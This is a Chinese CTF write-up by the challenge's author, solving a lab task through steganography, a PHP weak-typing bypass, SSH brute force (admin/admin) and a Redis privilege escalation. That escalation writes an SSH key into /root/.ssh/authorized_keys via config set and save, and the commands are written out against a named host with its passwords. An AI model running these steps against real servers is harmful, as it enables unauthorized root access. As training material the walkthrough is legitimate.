> 原文链接: https://www.anquanke.com//post/id/86847 


# 【CTF 攻略】ISC2017 DEFCON GROUP 解救Cookie Write-Up


                                阅读量   
                                **131709**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t0168462064ee37dea5.png)](https://p1.ssl.qhimg.com/t0168462064ee37dea5.png)

<br>

**0x00：写在前面**

实不相瞒这题是我出的，因为帮基友捧场外加想试一下出题，所以出了这么一道题给大家，结果由于本人13号还有一个topic在大数据与威胁分析论坛，最后导致柴总爱犬被多关了24个小时，本人对此深表歉意。还有各位大佬表哥表姐先别着急给我寄刀片，我拒收任何快递，得意.jpg。

首先先来说一下题目本身：这次题是一道披着CTF题，但实际考察是渗透测试和入侵检测的点，所以各位赛棍很多人都卡在了开始甚至是某首次攻破vmware的大表哥（其实这事儿赖我）。

解题的正常思路是这样的：Google Hacking-》代码审计（可以绕过）-》SSH暴力破解-》Redis提权写入SSH密钥-》修改文件-》开锁。



**0x01：隐写题目**

这道题说着是考隐写，实际上则是考察的大家利用搜索引擎解决问题，因为之前在赛场上给过大家一点提示：使用最简单最直接的方法去解决问题，谷歌/百度/360搜索：隐写在线工具，解密的工具在：[图片隐写术加密 – 图片隐写术解密 – 图片中隐藏文字信息 – aTool在线工具](http://link.zhihu.com/?target=http%3A//www.atool.org/steganography.php)，将图片下载到本地利用这个工具解密可以得到Flag：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c84fea09a16915b9.png)

这里可以得到下一题的Flag。



**0x02：代码审计**

这个题目是一个送分题，可以很清楚的看到使用弱类型可以得到flag，PoC：

```
curl "http://sweeperssl.synology.me:8081/index.php?pass1%5B1%5D=123&amp;pass2%5B%5D=123&amp;nsukey=hxOXBF7yMVWo5%2BZfUhvr6m%2FaT4vDgA7gIiIarcM8JfOtyRB3OmxCzjclJkiNmjtjxD8wTaA%2FLPvUFhW64xKXkDbjaJhwsbWRlDAeIuYI2B0RHi4oWAmJGg1ajGlYHZ3bXJAo%2BSHAMjKZ%2BqeThcytW%2FoHhaSzD0tlXe%2B49LqheWVou3lIBHNJRR07%2Fh3FaNbK"
```

重点提示是在第一句话，仔细阅读理解题目可以得到913端口为SSH端口（明天（9.13）OpenSSH会发布漏洞（SSH弱口令）），使用Hydra直接爆破可以得到服务器弱口令admin/admin。正因为是送分题，所以可以被绕过。



**0x03：SSH爆破/远程登录**

SSH爆破的过程不说了，上面已经说到了，得到服务器密码之后可以远程登录服务器：

```
ssh admin@sweeperssl.synology.me -p 913
```

登陆之后我们会直接去找flag：



```
find / -name lockcommand
Output: /tmp/flag/lockcommand
```

**<br>**

**0x04：写入&amp;提权**

我们得到了flag在/tmp/flag下面，但是使用ls -alh我们可以看到flag的所有者是root：

[![](https://p4.ssl.qhimg.com/t0101b64eea56eb569a.png)](https://p4.ssl.qhimg.com/t0101b64eea56eb569a.png)

所以这个时候你写入的话就会：

[![](https://p0.ssl.qhimg.com/t016a5d97679aa6afa8.png)](https://p0.ssl.qhimg.com/t016a5d97679aa6afa8.png)

如果尝试sudo的话，你们会发现sudo被我干掉了:)

所以说很明显提权这里不是用来sudo的，那么这个时候需要看一下有没有能提权的东西，我们使用

```
netstat -ano
```

来查看有没有什么端口开着：

[![](https://p1.ssl.qhimg.com/t01a6eca0e65f917820.png)](https://p1.ssl.qhimg.com/t01a6eca0e65f917820.png)

恩，我们看到了一个**127.0.0.1:62379**的端口，再使用

```
ps -ef|grep 62379
```

可以看到服务是一个redis服务：



```
admin@DC012:$ps -ef|grep 62379
Output: redis-server 127.0.0.1:62379
```

这个时候鸡贼的各位兄贵直接撸起袖子就是干，直接使用

```
redis-cli -p 62379
```

结果发现：

[![](https://p4.ssl.qhimg.com/t01655d568ab25fdc1d.png)](https://p4.ssl.qhimg.com/t01655d568ab25fdc1d.png)

惊不惊喜！意不意外！开不开心！Redis不仅没有开放公网，而且还有认证，233333，是不是很想给出题人寄刀片？但是先不着急，我们可以找配置文件啊，所以果断找一下配置文件：



```
admin@DC012:$ find / -name redis.conf
Output: /usr/bin/redis/redis.conf
```

然后你们就会去很鸡贼的查看密码：



```
admin@DC012: $ cat /usr/bin/redis/redis.conf |grep requirepass
Output: #requirepass password
admin@DC012: $ cat /usr/bin/redis/redis.conf |grep Port
Output: Port 6379
```

答题人：WTF？Redis的端口不是62379么？怎么变成了6379？我可能遇到了假的配置文件！！

是的没错，这里是一个坑，你以为你以为的就是真的？Nope！其实真实的配置文件在/usr/sbin/red1s.conf下面，这里你可以通过文件来获得redis的密码：

[![](https://p0.ssl.qhimg.com/t0148b880a96d50167b.png)](https://p0.ssl.qhimg.com/t0148b880a96d50167b.png)

然后你就会测试一下：

[![](https://p4.ssl.qhimg.com/t01d050eaddb5171381.png)](https://p4.ssl.qhimg.com/t01d050eaddb5171381.png)

恩，看来这次终于解决了（内心OS：大哥为什么要这么玩我）

然后就是正常的Redis写SSH密钥套路：



```
test@elknot360corpsec: $ ssh-keygen -t rsa -C fxckU
test@elknot360corpsec: $ cd ~/.ssh
test@elknot360corpsec: $  (echo -e 'nn';cat id_rsa.pub;echo -e "nn") &gt; foo.txt
test@elknot360corpsec: $ scp foo.txt -P 913 admin@sweeperssl.synology.me:foo.txt
```

另一台机器：



```
admin@DC012: $ redis-cli -p 62379 -a cookie@dc010 flushall
admin@DC012: $ redis-cli -p 62379 -a cookie@dc010 -x config set dir /root/.ssh
admin@DC012: $ redis-cli -p 62379 -a cookie@dc010 -x config set dbfilename authorized_keys
admin@DC012: $ redis-cli -p 62379 -a cookie@dc010 save
admin@DC012: $ cat foo.txt| redis-cli -p 62379 -a cookie@dc010 -x set crackit
admin@DC012: $ cat foo.txt| redis-cli -p 62379 -a cookie@dc010 save
```

这个时候你就可以干任何可怕的事儿了：



```
test@elknot360corpsec: $ ssh -i id_rsa root@sweeperssl.synology.me -p 913
admin@DC012:#
admin@DC012:# echo unlock &gt; /tmp/flag/lockcommand
```

OK Cookie就被放出来了:)

[![](https://p4.ssl.qhimg.com/t011aab501fc39829f0.jpg)](https://p4.ssl.qhimg.com/t011aab501fc39829f0.jpg)

Finally: 大家千万不要给我寄刀片，有话我们可以好好说，facepalm.png
